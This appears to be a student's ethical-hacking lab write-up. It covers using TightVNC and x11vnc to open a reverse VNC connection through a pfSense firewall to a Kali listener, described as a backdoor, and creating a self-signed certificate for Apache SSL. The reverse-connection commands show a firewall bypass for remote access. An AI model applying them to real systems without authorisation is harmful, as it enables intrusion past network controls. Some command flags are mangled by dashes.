#  VNC as a Backdoor and Creating/Installing SSL Certificates

## Objective
Topology: OpenSUSE, pfSense, and Kali

- Utilize TightVNC to create a reverse connection through a firewall.
- Create a self-signed X.509 certificate and install it on a Linux web server.
---

## Overview / Directions
**OpenSUSE**

1. Inititated TightVNC in an OpenSUSE Terminal.
2. Switched to Kali Terminal and input the 'vncviewer' command to open a server window.
3. Input the OpenSUSE IP address:5902 and password. Closed the window that appeared and switched back to the OpenSUSE tab and input 'vncserver–kill :2'.
4. Switched back to the Kali Terminal and input 'vncviewer–listen 0'.
5. Switched back to the OpenSUSE Terminal and navigated to the /usr/bin directory and established a listener connection outside of the firewall with ' ./x11vnc–connect IP
   address:5500'.

**Kali Linux**

Self-Signed Cert:

1. Generated an SSL key >  openssl genrsa–out ca.key 2048
2. Generated a new Certificate Signing Request (CSR) >  openssl req–new–key ca.key–out ca.csr
3. Filled out a Distinguished Name (DN) to be incorporated into the CSR
4. Generated a self-signed key >  openssl x509–req–days 365–in ca.csr–signkey ca.key–out ca.crt
5. Copied the ca.crt file from the current directory to the /etc/ssl/certs/ directory >  cp ca.crt /etc/ssl/certs/ca.crt
6. Copied the ca.key file from the current directory to the /etc/ssl/private directory >  cp ca.key /etc/ssl/private/ca.key
7. Copied the ca.csr file from the current directory to the /etc/ssl/private/ directory >  cp ca.csr /etc/ssl/private/ca.csr

Apache SSL File Configuration/SSL Cert Testing:

1. Navigated to the /etc/apache2/sites-available/ directory >  cd /etc/apache2/sites-available
2. Copied the default-ssl.conf file >  cp default-ssl.conf localhost-ssl.conf
3. Edited the localhost-ssl.conf file using the Mousepad file editor >  mousepad localhost-ssl.conf
4. Changed the SSLCertificateFile and SSLCertificateKeyFile paths >  SSLCertificateFile /etc/ssl/certs/ca.crt SSLCertificateKeyFile /etc/ssl/private/ca.key
5. Saved the fie. Exited Mousepad.
6. Changed to the sites-enabled directory >  cd /etc/apache2/sites-enabled/
7. Enabled the localhost-ssl site >  ln-s /etc/apache2/sites-available/localhost-ssl.conf
8. Enabled the SSL Apache Mod >  a2enmod ssl
9. Restarted the Apache service > service apache2 restart
10. Opened web browser and viewed ht*ps://localhost warning message/certificate details.


---

## Tools / Skills Used
- **Tools:** TightVNC; OpenSUSE; Kali Linux
- **Skills:** file/directory management; X.509 SSL certificates; web server (Apache) SSL certification configuration

---

## Proof of Completion
**[Documentation](./Documentation)**

---

## Key Takeaway
This lab strengthened my **technical adaptability and problem-solving** skills by establishing a secure reverse VNC connection and manually creating and configuring SSL certificates on a Linux web server. Navigating multi-step processes across TightVNC, OpenSUSE, Kali, and Apache enhanced my **persistence, analytical reasoning, and foresight** in planning secure configurations. These abilities transfer directly to real-world scenarios where secure remote access and encrypted communications are critical for system integrity.

**[Return to Ethical Hacking Overview](./../README.md)**
